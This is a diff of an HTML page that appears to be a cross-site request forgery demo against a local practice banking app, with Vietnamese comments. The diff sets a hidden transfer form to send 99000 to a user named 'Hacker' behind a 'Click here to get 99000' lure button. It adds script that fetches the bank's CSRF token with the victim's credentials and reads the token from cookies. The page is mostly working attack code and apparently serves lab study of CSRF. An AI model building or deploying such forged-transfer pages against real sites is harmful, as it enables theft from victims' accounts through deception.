@@ -9,21 +9,41 @@
 <h2>Get money free</h2>
 <form id="transferForm" action="http://banklord.localhost:11000/transfer" method="post">
     <label hidden for="recipientUsername">Recipient Username:</label>
-    <input hidden type="text" name="recipientUsername" id="recipientUsername" value="Bob" required>
+    <input hidden type="text" name="recipientUsername" id="recipientUsername" value="Hacker" required>
     <br>
     <label hidden for="amount">Amount:</label>
-    <input hidden type="number" name="amount" id="amount" min="0" value="100000" required>
+    <input hidden type="number" name="amount" id="amount" min="0" value="99000" required>
     <br>
-    <button type="submit">Get money free</button>
+    <button type="submit">Click here to get 99000</button>
 </form>
 <script>
+    axios.get('http://bank.banklord.localhost:11000/csrf',
+        {
+            headers: {
+                'Access-Control-Allow-Origin': '*' // Cho phép tất cả các nguồn gốc
+            },
+            // mode: "cors",
+            withCredentials: true,
+
+        })
+        .then(response => {
+            const { parameterName, token, headerName } = response.data;
+
+            // Tạo cookie
+            //   document.cookie = `${headerName}=${token}; expires=${new Date(Date.now() + 3600000).toUTCString()}; path=/; samesite=lax`;
+
+            console.log('CSRF token đã được lưu vào cookie');
+        })
+        .catch(error => {
+            console.error('Error fetching CSRF token:', error);
+        });
     const form = document.getElementById('transferForm');
     form.addEventListener('submit', (event) => {
         const csrfToken = document.cookie.replace(/(?:(?:^|.*;\s*)XSRF-TOKEN\s*\=\s*([^;]*).*$)|^.*$/, '$1');
-        const accessToken = document.cookie.replace(/(?:(?:^|.*;\s*)jwt_access_token\s*\=\s*([^;]*).*$)|^.*$/, '$1');
+       // const accessToken = document.cookie.replace(/(?:(?:^|.*;\s*)jwt_access_token\s*\=\s*([^;]*).*$)|^.*$/, '$1');
         event.preventDefault(); // Ngăn chặn submit form mặc định
         console.log(csrfToken);
-        console.log(accessToken);
+        //console.log(accessToken);
         const formData = new FormData(form);
         const recipientUsername = formData.get('recipientUsername');
         const amount = formData.get('amount');
